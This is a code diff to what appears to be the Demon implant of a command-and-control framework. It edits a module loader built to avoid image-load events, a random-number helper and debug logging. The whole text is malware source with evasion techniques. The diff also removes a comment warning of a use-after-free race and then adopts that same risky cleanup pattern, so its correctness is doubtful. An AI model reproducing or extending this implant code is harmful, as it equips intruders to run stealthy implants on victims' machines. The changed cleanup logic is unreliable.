@@ -242,11 +242,14 @@ PVOID LdrModuleLoad(
     /* get size of module unicode string */
     DestSize = StringLengthW( NameW ) * sizeof( WCHAR );
 
+    PRINTF( "LdrModuleLoad: ENTRY '%s' ProxyLoading=%d\n", ModuleName, Instance->Config.Implant.ProxyLoading )
+
     /* check if the module is already loaded */
     Module = LdrModuleSearch( NameW );
 
     /* if found, avoid generating an image-load event */
     if ( Module ) {
+        PRINTF( "LdrModuleLoad: '%s' already loaded at %p (LdrModuleSearch hit)\n", ModuleName, Module )
         return Module;
     }
 
@@ -264,17 +267,10 @@ PVOID LdrModuleLoad(
             }
 
             /* call LoadLibraryW.
-             *
-             * NOTE: WT_EXECUTEONLYONCE is intentionally NOT set.
-             * WT_EXECUTEONLYONCE tells the pool to auto-deregister the wait
-             * immediately after the callback completes, which races with our
-             * explicit RtlDeregisterWaitEx(Wait, INVALID_HANDLE_VALUE) call
-             * at END: and can dereference a freed TP_WAIT object on some
-             * builds. Without the flag, the wait stays live until the
-             * explicit deregister — which blocks until the callback is fully
-             * done and the wait object is safely reaped.
-             * See BUG-LDR-3 in SleepObf-Analysis.md §8. */
-            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlRegisterWait( &Wait, Event, C_PTR( Instance->Win32.LoadLibraryW ), NameW, 0, WT_EXECUTEINWAITTHREAD ) ) ) {
+             * WT_EXECUTEONLYONCE auto-deregisters the wait after the
+             * callback completes — no explicit RtlDeregisterWaitEx needed.
+             * See HVC-011 in CHANGES.md. */
+            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlRegisterWait( &Wait, Event, C_PTR( Instance->Win32.LoadLibraryW ), NameW, 0, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD ) ) ) {
                 PRINTF( "RtlRegisterWait: %p\n", NtStatus )
                 goto DEFAULT;
             }
@@ -323,6 +319,7 @@ PVOID LdrModuleLoad(
             /* after 5 times checking give up.
              * use LdrLoadDll instead */
             if ( ! Count ) {
+                PUTS( "LdrModuleLoad: PEB poll exhausted (5 retries), falling back" )
                 break;
             }
 
@@ -331,8 +328,11 @@ PVOID LdrModuleLoad(
              * NOTE: we are getting the module by string because there are some hash collisions
              *       when using LdrModulePeb */
             if ( ( Module = LdrModulePebByString( NameW ) ) ) {
+                PRINTF( "LdrModuleLoad: PEB poll hit after %lu retries, Module=%p\n", (unsigned long)( 5 - Count ), Module )
                 break;
             }
+
+            PRINTF( "LdrModuleLoad: PEB poll miss (Count=%lu remaining), sleeping 100ms\n", (unsigned long) Count )
 
             /* a little delay between each PEB check */
             SharedSleep( 100 );
@@ -374,28 +374,20 @@ END:
 
     PRINTF( "Module \"%s\": %p\n", ModuleName, Module )
 
-    /* deregister wait handle (blocks until the callback has fully returned,
-     * so the Event handle is safe to close after this).
-     * Only call this on a wait handle — NEVER on a timer handle. */
-    if ( Wait ) {
-        Instance->Win32.RtlDeregisterWaitEx( Wait, INVALID_HANDLE_VALUE );
-        Wait = NULL;
-    }
-
-    /* close queue BEFORE closing Event — RtlDeleteTimerQueueEx blocks until
-     * all timers (including our LoadLibraryW timer) have finished, which
-     * guarantees the callback is done touching the parameters.
-     * Note: TimerHdl is implicitly reaped by queue destruction. */
-    if ( Queue ) {
-        Instance->Win32.RtlDeleteTimerQueueEx( Queue, INVALID_HANDLE_VALUE );
-        Queue = NULL;
-        TimerHdl = NULL;
-    }
-
-    /* close event end */
+    /* close event */
     if ( Event ) {
         SysNtClose( Event );
         Event = NULL;
+    }
+
+    /* Non-blocking queue cleanup.
+     * TimerHdl is implicitly reaped by queue destruction.
+     * Wait handle (RtlRegisterWait path) is auto-deregistered by
+     * WT_EXECUTEONLYONCE — no explicit deregister needed. */
+    if ( Queue ) {
+        Instance->Win32.RtlDeleteTimerQueue( Queue );
+        Queue = NULL;
+        TimerHdl = NULL;
     }
 
     return Module;
@@ -1343,8 +1335,10 @@ ULONG RandomNumber32(
 
     Seed = NtGetTickCount();
     Seed = Instance->Win32.RtlRandomEx( &Seed );
+    Seed = Instance->Win32.RtlRandomEx( &Seed );
+    Seed = ( Seed % ( LONG_MAX - 2 + 1 ) ) + 2;
 
-    return Seed;
+    return Seed % 2 == 0 ? Seed : Seed + 1;
 }
 
 /*!
@@ -1462,7 +1456,7 @@ VOID DemonPrintf( PCHAR fmt, ... )
     Instance->Win32.LocalFree( CallbackOutput );
 }
 
-#elif defined(SHELLCODE) && defined(DEBUG)
+#elif (defined(SHELLCODE) || defined(DEBUG_NOSTDLIB)) && defined(DEBUG)
 
 VOID LogToConsole(
     IN LPCSTR fmt,
